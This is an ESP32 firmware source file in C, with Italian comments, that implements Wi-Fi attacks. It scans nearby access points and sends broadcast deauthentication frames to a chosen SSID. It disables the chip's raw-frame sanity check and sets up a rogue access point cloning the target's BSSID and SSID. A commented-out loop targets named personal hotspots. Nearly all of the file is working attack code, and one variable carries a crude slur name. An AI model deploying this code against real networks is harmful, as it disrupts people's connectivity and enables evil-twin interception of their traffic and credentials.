
#include "freertos/FreeRTOS.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "nvs_flash.h"
#include <time.h>
#include "deauth.h"
#include "lib.h"
#include "sniff.h"
#include <string.h>
#include "esp_log.h"
#include "serializer.h"

#define TASK_NAME "spam_task"

wifi_ap_record_t *apRecords;
uint8_t level = 0, channel = 2;
uint16_t AP_num;
void deauth_task(MacAddr bssid, uint8_t prim_chan);
void attack_method_rogueap(wifi_ap_record_t* ap_record);
void scanWifi();
bool scan = true;



//esp_err_t esp_wifi_set_mac(wifi_interface_t ifx, const uint8_t mac[6])
void spoofMAC(MacAddr* pMAC ){
    //apple 98:ca:33
    unsigned char gay[3];
    for(int i = 0; i <3 ;i++){
        gay[i]= (unsigned char) rand() % 256; 
    }


    for(int i =0 ; i<3 ;i++){
        (*pMAC)[3+i] = gay[i];
    }
        

}

bool get_scan(){
    return scan;
}
void set_scan(){
    scan = true;
}

uint16_t get_AP_num(){
    return AP_num;
}

wifi_ap_record_t* getAPrecords(){

    
    return apRecords;
}
//esp_err_t esp_wifi_scan_start(const wifi_scan_config_t *config, bool block)
//esp_err_t esp_wifi_scan_stop(void)
//esp_err_t esp_wifi_scan_get_ap_records(uint16_t *number, wifi_ap_record_t *ap_records)



// void scanWifi(){
    
    
//     ESP_LOGI(TASK_NAME, "entrato nella funzione SCANWIFI");
//     bool deauth_attack = 1;
    
//     while(1){


//         // ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
        
//         //esp_wifi_disconnect();
        
 
//         esp_wifi_scan_start(NULL,true);
//         //esp_wifi_connect();

//         uint16_t maxAP = 15; //arbitrary number max APs stored
//         esp_wifi_scan_get_ap_num(&maxAP);
//         AP_num = maxAP;

//         //free(apRecords); //per evitare robe strane o stack overflow loschi o checcazzoneso
//         wifi_ap_record_t ap_record_tmp[AP_num];
//         apRecords = ap_record_tmp;
//         //wifi_ap_record_t  apRecords[AP_num];
//         //apRecords = (wifi_ap_record_t *) realloc(apRecords,maxAP * sizeof(wifi_ap_record_t));
//         esp_wifi_scan_get_ap_records(&maxAP , apRecords);
//         esp_wifi_scan_stop();

        
//         for(int i=0;i < AP_num;i++){
//             ESP_LOGI(TASK_NAME, "SSID: %s", apRecords[i].ssid);
//             ESP_LOGI(TASK_NAME, "BSSID: %x:%x:%x:%x:%x:%x", apRecords[i].bssid[0],apRecords[i].bssid[1],apRecords[i].bssid[2],apRecords[i].bssid[3],apRecords[i].bssid[4],apRecords[i].bssid[5]);
//             print_auth_mode(apRecords[i].authmode);
//             ESP_LOGI(TASK_NAME, "RSSI: %d", apRecords[i].rssi);
//             ESP_LOGI(TASK_NAME, "########################################\n");
//             //if(!strcmp("iPhone di Chiara", (char *)apRecords[i].ssid) || !strcmp("iPhone di Chiara\n", (char *)apRecords[i].ssid)){
//             if(!strcmp("Xiaomi 11T Pro", (char * ) apRecords[i].ssid)){
//                 for(int u = 0; u < 3; u++){
//                     ESP_LOGI(TASK_NAME, "entering DEAUTH_TASK%d\n",u);
//                     deauth_task(apRecords[i].bssid,apRecords[i].primary);
//                     attack_method_rogueap(&apRecords[i]);
//                     vTaskDelay(1000 / portTICK_PERIOD_MS);
//                     deauth_attack=0;
//                 }
//             }
//         }
//         //free(ap_record_tmp);
//         wifictl_mgmt_ap_start();
//         wifictl_restore_ap_mac();
//         vTaskDelay(20000 / portTICK_PERIOD_MS);
//     }
// }

void attack_ssid(char* ssid){

    for(uint8_t n = 0; n < AP_num; n++){
        if(!strcmp((char*)apRecords[n].ssid, ssid)){
            for(int u = 0; u < 3; u++){
                ESP_LOGI(TASK_NAME, "entering DEAUTH_TASK%d\n",u);
                deauth_task(apRecords[n].bssid,apRecords[n].primary);
                attack_method_rogueap(&apRecords[n]);
                vTaskDelay(1000 / portTICK_PERIOD_MS);
            }
        }
    }
    wifictl_mgmt_ap_start();
    wifictl_restore_ap_mac();
}

void scanWifi(){
    
    ESP_LOGI(TASK_NAME, "entrato nella funzione SCANWIFI");
    while(1){
        // ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
        if(scan){
            esp_wifi_scan_start(NULL,true);
            vTaskDelay(2500 / portTICK_PERIOD_MS);

            esp_wifi_scan_stop();
            uint16_t maxAP = 15; //arbitrary number max APs stored
            esp_wifi_scan_get_ap_num(&maxAP);
            AP_num = maxAP;
            wifi_ap_record_t apRecords_tmp[maxAP];
            esp_wifi_scan_get_ap_records(&maxAP , apRecords_tmp);
            apRecords = (wifi_ap_record_t *)realloc(apRecords, maxAP*sizeof(wifi_ap_record_t));
            memcpy(apRecords,apRecords_tmp,sizeof(wifi_ap_record_t) * maxAP);
            ESP_LOGI(TASK_NAME, "AP_NUM: %d", AP_num);


            for(int i=0;i < AP_num;i++){
                ESP_LOGI(TASK_NAME, "SSID: %s", apRecords_tmp[i].ssid);

                ESP_LOGI(TASK_NAME, "BSSID: %x:%x:%x:%x:%x:%x", apRecords_tmp[i].bssid[0],apRecords_tmp[i].bssid[1],apRecords_tmp[i].bssid[2],apRecords_tmp[i].bssid[3],apRecords_tmp[i].bssid[4],apRecords_tmp[i].bssid[5]);
                print_auth_mode(apRecords_tmp[i].authmode);
                ESP_LOGI(TASK_NAME, "RSSI: %d", apRecords_tmp[i].rssi);
                ESP_LOGI(TASK_NAME, "########################################\n");
            }    
        }
        ESP_LOGI(TASK_NAME, "scan tick log");
        scan = false;
        vTaskDelay(6000 / portTICK_PERIOD_MS);
    }
}

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0; //LA FUNZIONE IMPEDISCE DI MANDARE PACCHETTI "STRANI"
}

void deauth_task(MacAddr bssid, uint8_t prim_chan) {

    
    const MacAddr TARGET = { 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
    };

    MacAddr AP = {
        //re place with your AP's mac address
        //98:ca:33
        0x98, 0xca, 0x33, 0x32, 0x65, 0xe4
    };
    esp_err_t res;

    res = deauth(TARGET, AP, bssid, 1, prim_chan);
    
    ESP_LOGI(TASK_NAME," RES:  %s\n", esp_err_to_name(res));
    
    vTaskDelay(5000 / portTICK_PERIOD_MS);

}

uint8_t strlen_uint8(uint8_t *str){
    uint8_t i = 0;
    while(str[i] != '\0'){
        i++;
    }
    return i;
}

void attack_method_rogueap(wifi_ap_record_t *ap_record){
    ESP_LOGD(TASK_NAME, "Configuring Rogue AP");
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, ap_record->bssid));
    wifi_config_t ap_config = {};
    ap_config.ap.ssid_len = strlen_uint8((uint8_t *)ap_record->ssid);
    ap_config.ap.channel = ap_record->primary;
    ap_config.ap.authmode = ap_record->authmode;
    memcpy((unsigned char*) ap_config.ap.password,"dummypassword",14);
    ap_config.ap.max_connection = 1;
    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
}

void wardriver_init(void *pvParameter){
    
    pcap_serializer_init();
    wifi_sniffer_init();
    //wifi_sniffer_set_channel(channel);
    scanWifi();

}

void main_deauth(void) {
    srand(time(NULL));

    
    // nvs_flash_init();
    // esp_netif_init();    
    // wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    // ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    // ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    // ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));

    // ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    // ESP_ERROR_CHECK(esp_wifi_start());
    // ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
    xTaskCreate(&wardriver_init, TASK_NAME, 8192 /*profondità dellostack*/, NULL, 5, NULL);
}

